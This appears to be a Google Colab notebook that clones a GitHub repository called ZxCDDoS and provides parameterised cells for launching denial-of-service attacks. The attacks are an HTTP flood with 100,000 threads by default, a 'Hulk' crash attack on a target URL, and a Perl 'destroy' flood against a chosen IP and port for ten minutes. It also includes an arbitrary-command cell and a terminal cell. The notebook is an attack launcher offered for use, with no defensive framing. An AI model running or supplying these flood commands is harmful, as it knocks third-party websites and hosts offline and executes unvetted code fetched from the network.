# %%
#@title **SetUp {RUN AT FIRST}**
#@markdown  Download And Setup
import os

os.system("apt update")
# %cd ~
os.system("rm -rf ZxCDDoS")
os.system("git clone https://github.com/nalayakofficial/ZxCDDoS")
os.system("pip install -r ZxCDDoS/requirements.txt")
os.system("apt install golang")
# %cd ZxCDDoS
os.system("pip install colab-xterm")
# %load_ext colabxterm

# %%
#@title **httpflood**
#@markdown  Flood Http



url = "http://example.com" #@param {type:"string"}
time = 60 #@param {type: "integer"}
threads = 100000#@param {type: "integer"}
# !go run httpflood.go $url $threads get $time nil

# %%
#@title **crash**
#@markdown  Crash
url = "" #@param {type:"string"}
# !go run Hulk.go -site $url -data GET

# %%
#@title **Destroy**
#@markdown  Destroy Ip
ip = "" #@param {type:"string"}
port = "" #@param {type:"string"}
time = 600 #@param {type:"integer"}
# !perl destroy.pl $ip $port 65500 $time

# %%
#@title **Custom**
#@markdown  Custom

command = ""#@param {type:"string"}
# !$command

# %%
#@title **Terminal**
#@markdown  Show Terminal
# %xterm
